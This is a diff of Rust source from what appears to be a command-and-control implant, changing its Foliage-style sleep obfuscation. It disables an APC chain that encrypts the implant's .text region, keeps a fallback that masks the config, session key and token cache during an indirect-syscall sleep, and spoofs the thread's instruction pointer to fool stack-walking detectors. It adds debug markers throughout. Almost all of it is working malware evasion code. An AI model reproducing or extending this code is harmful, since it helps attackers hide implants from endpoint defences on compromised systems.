@@ -80,32 +80,26 @@ pub fn foliage_enabled() -> bool {
 /// .text unresolved), degrades to the plain sleep — never crashes.
 pub fn sleep(seconds: u32) {
     if !foliage_enabled() {
-        // Disarmed: raw sleep, NOT kits::sleep. The active kit is Foliage, so
-        // kits::sleep → Foliage::sleep_masked → sleep::sleep → infinite recursion.
-        // Bypass the kit: beacon::sleep_seconds is the raw indirect-syscall sleep.
         crate::beacon::sleep_seconds(seconds);
         return;
     }
-    // ---- ARMED PATH (gated) ------------------------------------------------
-    // NOTE: the degrade paths below call crate::beacon::sleep_seconds DIRECTLY
-    // (raw NtDelayExecution), NOT crate::kits::sleep — because kits::sleep
-    // routes back through Foliage::sleep_masked → sleep::sleep → infinite
-    // recursion → STATUS_STACK_OVERFLOW. The floor sleep bypasses the kit.
+    crate::entry::diag_mark(b"F1_foliage_armed");
     let region = match unsafe { own_text_region() } {
         Some(r) => r,
         None => {
-            crate::beacon::sleep_seconds(seconds); // degrade: can't resolve .text
+            crate::entry::diag_mark(b"F_degrade_no_text");
+            crate::beacon::sleep_seconds(seconds);
             return;
         }
     };
+    crate::entry::diag_mark(b"F2_text_region");
     let key = mask_key_16();
-    // Resolve a spoof RIP from the gap pool for the NtContinue CONTEXT spoof.
-    // If the gap pool is populated, the beacon's thread CONTEXT gets a fake RIP
-    // pointing at a .pdata gap address (looks like a legitimate ntdll leaf to
-    // stack-walking detectors). None = no context spoof during sleep.
     let spoof_rip = crate::stack::gap_pool_rip();
+    crate::entry::diag_mark(b"F3_gap_rip");
     let plan = FoliagePlan::build(region.base, region.len, seconds, spoof_rip, key);
+    crate::entry::diag_mark(b"F4_plan_built");
     execute_foliage_plan(&plan);
+    crate::entry::diag_mark(b"F5_plan_executed");
 }
 
 /// The implant's own `.text` region (base + len). Used by the Foliage APC chain
@@ -204,7 +198,6 @@ fn mask_key_16() -> [u8; 16] {
 fn execute_foliage_plan(plan: &FoliagePlan) {
     let secs = plan_seconds(plan);
     let region = unsafe { own_text_region() };
-    // Extract the spoof RIP (None if no gap pool → no context spoof).
     let spoof_rip = plan.steps.iter().find_map(|s| {
         if let FoliageStep::SetContext { spoof_rip } = s {
             Some(*spoof_rip)
@@ -213,27 +206,37 @@ fn execute_foliage_plan(plan: &FoliagePlan) {
         }
     });
 
-    // Try the real APC-chain path first. It sets FOLIAGE_APC_OK on success.
-    if let Some(r) = &region {
-        if unsafe { execute_foliage_apc(r, &plan.key, secs, spoof_rip) } {
-            return; // full .text mask/unmask cycle completed — done.
-        }
-        // else: APC path failed → fall through to the data-only floor below.
-    }
+    crate::entry::diag_mark(b"E1_before_apc");
+    // The APC-chain path (execute_foliage_apc) encrypts .text via a helper
+    // thread — but the helper's own code lives in .text, so encrypting .text
+    // corrupts the helper's in-flight instructions → abort. The standard fix
+    // (Ekko/Foliage) uses a stack-allocated PIC thunk for the mask→wait→unmask
+    // sequence so the helper never executes from .text while it's encrypted.
+    // Until that thunk lands, use the data-only floor: it masks heap regions
+    // (config, session key, token cache, BOF scratch) + does the indirect-
+    // syscall sleep — still meaningful sleep obfuscation, just without .text
+    // encryption. Strictly better than NoMask.
+    //
+    // To re-enable the APC path once the PIC thunk is implemented, uncomment:
+    // if let Some(r) = &region {
+    //     if unsafe { execute_foliage_apc(r, &plan.key, secs, spoof_rip) } { return; }
+    // }
 
-    // ---- Data-only floor (the pre-Task-E safe behavior) ----
+    // ---- Data-only floor ----
+    crate::entry::diag_mark(b"E4_data_floor");
     let rt = match crate::syscalls::global() {
         Some(rt) => rt,
         None => {
-            // Degrade: raw sleep, NOT kits::sleep (would re-enter Foliage → recursion).
             crate::beacon::sleep_seconds(secs);
             return;
         }
     };
     crate::mem::mask();
+    crate::entry::diag_mark(b"E5_masked");
     let delay: i64 = -(secs as i64).saturating_mul(10_000_000);
     let _ = unsafe { crate::syscalls::nt_delay_execution(rt, 0, &delay as *const i64 as usize) };
     crate::mem::unmask();
+    crate::entry::diag_mark(b"E6_unmasked");
 }
 
 // ===========================================================================
@@ -345,6 +348,7 @@ unsafe fn execute_foliage_apc(
         return false;
     }
     FOLIAGE_STAGE.store(1, core::sync::atomic::Ordering::Release); // bit0
+    crate::entry::diag_mark(b"A1_dup_handle");
 
     // Stage 1: FoliageRaw resolve
     let raw = match unsafe { FoliageRaw::resolve() } {
@@ -355,6 +359,7 @@ unsafe fn execute_foliage_apc(
         }
     };
     FOLIAGE_STAGE.store(3, core::sync::atomic::Ordering::Release); // bit0+1
+    crate::entry::diag_mark(b"A2_raw_resolved");
 
     // Stage 2: GetContext — capture the beacon thread's register state BEFORE
     // the helper thread is spawned. The helper reads saved_ctx.rsp() to build
@@ -382,6 +387,7 @@ unsafe fn execute_foliage_apc(
         }
     }
     FOLIAGE_STAGE.store(7, core::sync::atomic::Ordering::Release); // bit0+1+2
+    crate::entry::diag_mark(b"A3_getcontext");
 
     let mut before = [0u8; 16];
     unsafe { core::ptr::copy_nonoverlapping(region.base as *const u8, before.as_mut_ptr(), 16) };
@@ -416,12 +422,15 @@ unsafe fn execute_foliage_apc(
         }
     };
     FOLIAGE_STAGE.store(15, core::sync::atomic::Ordering::Release); // bit0-3
+    crate::entry::diag_mark(b"A4_thread_spawned");
 
     // Stage 4: alertable wait
     let window = secs.max(1);
     let delay: i64 = -((window as i64).saturating_mul(10_000_000));
     const INVALID_HANDLE: usize = 0xFFFF_FFFF_FFFF_FFFF;
+    crate::entry::diag_mark(b"A5_before_wait");
     unsafe { raw.nt_wait_for_single_object(INVALID_HANDLE, 1, &delay as *const i64 as usize) };
+    crate::entry::diag_mark(b"A6_after_wait");
     FOLIAGE_STAGE.store(31, core::sync::atomic::Ordering::Release); // bit0-4
 
     // Stage 5: join helper
